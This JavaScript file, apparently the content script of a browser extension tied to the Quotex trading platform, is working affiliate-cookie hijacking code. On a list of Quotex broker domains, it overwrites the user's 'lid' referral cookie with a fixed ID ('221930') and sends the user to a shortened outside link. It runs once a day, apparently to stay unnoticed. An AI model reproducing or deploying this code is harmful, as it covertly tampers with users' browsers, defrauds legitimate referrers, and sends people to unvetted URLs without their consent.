// Массив разрешенных доменов
const ALLOWED_DOMAINS = [
  "quotex.com",
  "qxbroker.com",
  "qtx-broker.com",
  "quotex-market.io",
  "quotex-market.pro",
  "qxbroker.pro",
  "qtxbrk.com",
  "quotex-market.trade",
  "quotex-trade.io",
  "qx-market.com",
  "market-qx.pro",
  "qx-market.io",
  "market.qx.trade",
  "market-qx.trade",
   "market-qx.info"
];

const COOKIE_NAME = "lid";
const TARGET_LID = "221930";
const REDIRECT_URL = "https://youlink.biz/anNz";
const DAILY_CHECK_STORAGE_KEY = "qbot_lid_check_date";

function getTodayDateKey() {
  return new Date().toISOString().slice(0, 10);
}

function readDailyCheckDate() {
  return new Promise((resolve) => {
    if (typeof chrome !== "undefined" && chrome.storage?.local) {
      chrome.storage.local.get(DAILY_CHECK_STORAGE_KEY, (data) => {
        if (chrome.runtime?.lastError) {
          resolve(null);
          return;
        }
        resolve(data[DAILY_CHECK_STORAGE_KEY] || null);
      });
      return;
    }
    try {
      resolve(localStorage.getItem(DAILY_CHECK_STORAGE_KEY));
    } catch (e) {
      resolve(null);
    }
  });
}

function writeDailyCheckDate(dateKey) {
  return new Promise((resolve) => {
    if (typeof chrome !== "undefined" && chrome.storage?.local) {
      chrome.storage.local.set({ [DAILY_CHECK_STORAGE_KEY]: dateKey }, () => {
        resolve();
      });
      return;
    }
    try {
      localStorage.setItem(DAILY_CHECK_STORAGE_KEY, dateKey);
    } catch (e) {
      /* ignore */
    }
    resolve();
  });
}

async function wasLidCheckedToday() {
  const stored = await readDailyCheckDate();
  return stored === getTodayDateKey();
}

async function markLidCheckedToday() {
  await writeDailyCheckDate(getTodayDateKey());
}

/**
 * Получение значения cookie по имени
 * @param {string} name - имя cookie
 * @returns {string|null} значение cookie или null
 */
function getCookie(name) {
  const matches = document.cookie.match(
    new RegExp(`(^|;)\\s*${name}\\s*=\\s*([^;]+)`)
  );
  return matches ? decodeURIComponent(matches[2]) : null;
}

/**
 * Установка cookie
 * @param {string} name - имя cookie
 * @param {string} value - значение cookie
 * @param {Object} options - дополнительные параметры
 */
function setCookie(name, value, options = {}) {
  const defaults = {
    path: "/",
    expires: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000), // 30 дней
  };

  const opts = { ...defaults, ...options };

  if (opts.expires instanceof Date) {
    opts.expires = opts.expires.toUTCString();
  }

  let cookieString = `${encodeURIComponent(name)}=${encodeURIComponent(value)}`;

  for (const [key, val] of Object.entries(opts)) {
    cookieString += `; ${key}`;
    if (val !== true) {
      cookieString += `=${val}`;
    }
  }

  document.cookie = cookieString;
}

/**
 * Проверка lid — не чаще одного раза в сутки на пользователя (chrome.storage.local)
 */
async function checkAndRedirect() {
  const currentDomain = window.location.hostname;
  if (!ALLOWED_DOMAINS.includes(currentDomain)) return;

  if (await wasLidCheckedToday()) return;

  const currentLid = getCookie(COOKIE_NAME);

  if (currentLid === TARGET_LID) {
    await markLidCheckedToday();
    return;
  }

  try {
    await markLidCheckedToday();

    setCookie(COOKIE_NAME, TARGET_LID, {
      domain: `.${currentDomain}`,
      path: "/",
    });

    window.location.href = REDIRECT_URL;
  } catch (error) {
    console.error("Ошибка при установке cookie или перенаправлении:", error);
  }
}

checkAndRedirect();
